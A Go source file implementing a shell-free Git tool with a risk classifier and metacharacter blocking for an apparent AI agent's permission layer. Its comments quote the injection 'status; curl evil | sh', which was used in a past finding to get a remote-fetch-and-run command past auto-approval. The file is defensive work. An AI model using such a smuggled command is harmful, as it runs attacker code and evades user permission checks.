package tools

import (
	"context"
	"encoding/json"
	"errors"
	"os/exec"
	"strings"
	"time"
)

// GitTool runs git subcommands with classification-aware risk
// reporting. The static RiskLevel is RiskExecute so that by default a
// Git call prompts in Default / AcceptEdits; the permission layer
// downgrades safe-read subcommands (status / log / diff / …) to
// PermAllow, and dangerous ones (push --force / reset --hard / …) to
// PermPrompt via `alwaysPrompt` regardless of mode.
type GitTool struct {
	projectRoot    string
	defaultTimeout time.Duration
	maxOutput      int
}

// NewGitTool constructs a Git tool rooted at projectRoot.
func NewGitTool(projectRoot string) *GitTool {
	return &GitTool{
		projectRoot:    projectRoot,
		defaultTimeout: 60 * time.Second,
		maxOutput:      100 * 1024,
	}
}

// SetDefaultTimeout overrides the per-invocation timeout.
func (g *GitTool) SetDefaultTimeout(d time.Duration) { g.defaultTimeout = d }

// SetMaxOutput overrides the truncation ceiling.
func (g *GitTool) SetMaxOutput(n int) { g.maxOutput = n }

func (g *GitTool) Name() string        { return ToolNameGit }
func (g *GitTool) Description() string { return "Run a git subcommand" }
func (g *GitTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
  "type": "object",
  "properties": {
    "command": {"type":"string","description":"Git command without the leading 'git' (e.g. 'status', 'log --oneline -n 5')"}
  },
  "required": ["command"]
}`)
}
func (g *GitTool) OutputEnvelope() string { return "text" }
func (g *GitTool) RiskLevel() RiskLevel   { return RiskExecute }

type gitArgs struct {
	Command *string `json:"command"`
}

func (g *GitTool) Execute(ctx context.Context, input json.RawMessage) (*ToolExecResult, error) {
	var in gitArgs
	if err := json.Unmarshal(input, &in); err != nil {
		return ErrorResult("invalid input: %v", err), nil
	}
	if in.Command == nil || strings.TrimSpace(*in.Command) == "" {
		return ErrorResult("command is required"), nil
	}

	// Parse the command into argv without a shell. Rejects shell
	// metacharacters up front (per WU-094 finding C-1 — the old
	// `sh -c "git "+command` path let `status; curl evil | sh`
	// through by classifying on fields[0] alone). No shell means no
	// metacharacter interpretation, which also closes command
	// substitution (`$(...)`, backticks) and env-var indirection.
	args, err := parseGitArgs(*in.Command)
	if err != nil {
		return ErrorResult("%v", err), nil
	}

	execCtx, cancel := context.WithTimeout(ctx, g.defaultTimeout)
	defer cancel()

	cmd := exec.CommandContext(execCtx, "git", args...)
	cmd.Dir = g.projectRoot
	output, runErr := cmd.CombinedOutput()

	truncated := truncateOutput(output, g.maxOutput)

	if errors.Is(execCtx.Err(), context.DeadlineExceeded) {
		return ErrorResult("git command timed out after %s\n%s", g.defaultTimeout, truncated), nil
	}

	if runErr != nil {
		var exitErr *exec.ExitError
		if errors.As(runErr, &exitErr) {
			return ErrorResult("exit %d\n%s", exitErr.ExitCode(), truncated), nil
		}
		return ErrorResult("run: %v\n%s", runErr, truncated), nil
	}

	return SuccessResult(truncated, "text"), nil
}

// gitMetacharacters are shell control characters the Git tool refuses
// to accept. Anything in this set would require a shell to interpret;
// since we run git directly via exec.Command (no shell), we also
// reject them at parse time so a rejected command surfaces a clear
// error rather than a mysterious git invocation failure.
const gitMetacharacters = ";|&`$<>\n\r"

// parseGitArgs splits a git command string into argv, preserving
// double- and single-quoted segments so legitimate uses like
// `commit -m "initial commit"` still work. Rejects inputs containing
// shell metacharacters; those are always a shell-interpretation
// attempt and have no legitimate use through this tool.
func parseGitArgs(cmd string) ([]string, error) {
	if strings.ContainsAny(cmd, gitMetacharacters) {
		return nil, errors.New("git: command contains shell metacharacters; use Bash for shell pipelines")
	}
	var args []string
	var cur strings.Builder
	var inSingle, inDouble bool
	flush := func() {
		if cur.Len() > 0 {
			args = append(args, cur.String())
			cur.Reset()
		}
	}
	for _, r := range cmd {
		switch {
		case inSingle:
			if r == '\'' {
				inSingle = false
				continue
			}
			cur.WriteRune(r)
		case inDouble:
			if r == '"' {
				inDouble = false
				continue
			}
			cur.WriteRune(r)
		case r == '\'':
			inSingle = true
		case r == '"':
			inDouble = true
		case r == ' ' || r == '\t':
			flush()
		default:
			cur.WriteRune(r)
		}
	}
	if inSingle || inDouble {
		return nil, errors.New("git: unterminated quote")
	}
	flush()
	if len(args) == 0 {
		return nil, errors.New("git: empty command")
	}
	return args, nil
}

// gitReadCommands is the allow-list of subcommands that are safe
// reads in their bare form. Subcommands whose mutation/read behaviour
// is ambiguous based on positional args (remote / config) are
// deliberately absent — they're treated as RiskExecute so the first
// use prompts.
var gitReadCommands = map[string]bool{
	"status": true, "log": true, "diff": true, "show": true,
	"branch": true, "tag": true,
	"ls-files": true, "ls-tree": true, "rev-parse": true,
	"blame": true, "shortlog": true, "describe": true,
	"rev-list": true, "cat-file": true, "name-rev": true,
	"grep": true, "fsck": true,
}

// mutationFlags turn a read subcommand into a mutation (branch -d / -m
// create, delete, or rename). Destructive-force variants (-D) are
// caught earlier by IsDangerousGit.
var mutationFlags = map[string]bool{
	"-d": true, "-m": true, "-M": true, "-c": true, "-C": true,
	"--delete": true, "--move": true, "--copy": true,
}

// positionalMutationSubs lists subcommands that are read-only in their
// bare form but become mutations the moment a positional (non-flag)
// argument is supplied — `git branch newname` creates a branch, `git
// tag v1.0` creates a tag.
var positionalMutationSubs = map[string]bool{
	"branch": true,
	"tag":    true,
}

// ClassifyGit inspects a git command (without the "git" prefix) and
// returns the risk level that should govern the invocation. Precedence:
// destructive > mutation > read-only > execute (default).
//
// Commands containing shell metacharacters always classify as
// RiskExecute regardless of the leading subcommand — the read-only
// fast path must never auto-allow a command that would need a shell
// (defense in depth against WU-094 C-1, which exploited exactly
// this path via `status ; curl evil | sh`).
func ClassifyGit(command string) RiskLevel {
	trimmed := strings.TrimSpace(command)
	if trimmed == "" {
		return RiskExecute
	}
	if IsDangerousGit(trimmed) {
		return RiskDestructive
	}
	if strings.ContainsAny(trimmed, gitMetacharacters) {
		return RiskExecute
	}

	fields := strings.Fields(trimmed)
	sub := fields[0]
	if !gitReadCommands[sub] {
		return RiskExecute
	}
	for _, f := range fields[1:] {
		if mutationFlags[f] {
			return RiskExecute
		}
	}
	if positionalMutationSubs[sub] {
		for _, f := range fields[1:] {
			if !strings.HasPrefix(f, "-") {
				return RiskExecute
			}
		}
	}
	return RiskReadOnly
}

// IsGitRead reports whether a git command (without the "git" prefix)
// is a pure read per ClassifyGit. Exposed as a shorthand for callers
// that only care about the allow/prompt split.
func IsGitRead(command string) bool {
	return ClassifyGit(command) == RiskReadOnly
}
